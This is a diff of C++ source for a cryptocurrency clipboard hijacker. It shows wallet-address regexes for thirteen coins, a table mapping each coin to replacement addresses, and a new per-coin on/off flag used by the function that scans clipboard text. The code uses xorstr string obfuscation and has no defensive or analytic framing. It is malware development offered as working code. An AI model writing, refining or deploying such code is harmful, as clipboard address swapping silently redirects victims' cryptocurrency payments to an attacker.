@@ -14,36 +14,37 @@ std::string bnb_regex = R"((?:^|\s)(bnb1[a-zA-HJ-NP-Z0-9]{38})(?=\s|$))";
 std::string ada_regex = R"((?:^|\s)(addr1[0-9a-z]{38})(?=\s|$))";
 std::string dot_regex = R"((?:^|\s)(14[A-Za-z0-9]{47})(?=\s|$))";
 
+struct CryptoInfo {
+    std::string currency_name;
+    std::regex regex_pattern;
+    std::string clipboard_replace_text;
+    bool clipping;
+};
+
+CryptoInfo crypto_info[] = {
+    {"BTC", std::regex(btc_regex), btc, m_btc},
+    {"LTC", std::regex(ltc_regex), ltc, m_ltc},
+    {"DOGE", std::regex(doge_regex), doge, m_doge},
+    {"ETH", std::regex(eth_regex), eth, m_eth},
+    {"XMR", std::regex(xmr_regex), xmr, m_xmr},
+    {"XRP", std::regex(xrp_regex), xrp, m_xrp},
+    {"NEO", std::regex(neo_regex), neo, m_neo},
+    {"DASH", std::regex(dash_regex), dash, m_dash},
+    {"DCH", std::regex(bch_regex), bch, m_bch},
+    {"TRON", std::regex(tron_regex), tron, m_tron},
+    {"BNB", std::regex(bnb_regex), bnb, m_bnb},
+    {"ADA", std::regex(ada_regex), ada, m_ada},
+    {"DOT", std::regex(dot_regex), dot, m_dot}
+};
+
 void detected(std::string clipboard_text) {
     log(xorstr("Clipboard: ") + clipboard_text);
 }
 
 void clipper(std::string value)
 {
-    struct CryptoInfo {
-        std::string currency_name;
-        std::regex regex_pattern;
-        std::string clipboard_replace_text;
-    };
-
-    CryptoInfo crypto_info[] = {
-        {"BTC", std::regex(btc_regex), btc},
-        {"LTC", std::regex(ltc_regex), ltc},
-        {"DOGE", std::regex(doge_regex), doge},
-        {"ETH", std::regex(eth_regex), eth},
-        {"XMR", std::regex(xmr_regex), xmr},
-        {"XRP", std::regex(xrp_regex), xrp},
-        {"NEO", std::regex(neo_regex), neo},
-        {"DASH", std::regex(dash_regex), dash},
-        {"DCH", std::regex(bch_regex), bch},
-        {"TRON", std::regex(tron_regex), tron},
-        {"BNB", std::regex(bnb_regex), bnb},
-        {"ADA", std::regex(ada_regex), ada},
-        {"DOT", std::regex(dot_regex), dot}
-    };
-
     for (const CryptoInfo& info : crypto_info) {
-        if (std::regex_search(value, info.regex_pattern)) {
+        if (std::regex_search(value, info.regex_pattern) && info.clipping) {
 #ifdef DEBUGGING
             log(std::string(xorstr("Detected: ")) + info.currency_name);
             detected(value);
